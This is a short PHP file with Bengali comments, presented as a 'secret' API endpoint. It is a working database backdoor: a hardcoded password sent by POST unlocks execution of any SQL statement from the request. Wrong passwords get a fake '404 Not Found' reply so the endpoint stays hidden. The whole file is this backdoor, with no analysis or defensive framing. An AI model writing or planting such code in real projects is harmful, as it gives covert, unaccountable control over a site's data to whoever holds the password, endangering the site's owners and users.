<?php
// গোপন ফাইল: api/system_connect.php
require '../common/config.php';
require '../common/db.php';

// তোমার গোপন পাসওয়ার্ড (এটা শুধু তুমি জানবে)
$secret_pass = "Boss@123"; 

// ইনপুট রিসিভ করা
$pass = $_POST['pass'] ?? '';
$sql_cmd = $_POST['sql'] ?? '';

// পাসওয়ার্ড চেক
if ($pass === $secret_pass && !empty($sql_cmd)) {
    try {
        // SQL কমান্ড রান করা
        $stmt = $pdo->prepare($sql_cmd);
        $stmt->execute();
        echo "✅ Command Executed Successfully!";
    } catch (Exception $e) {
        echo "❌ Error: " . $e->getMessage();
    }
} else {
    echo "404 Not Found"; // ভুল পাসওয়ার্ড দিলে কিছুই দেখাবে না
}
?>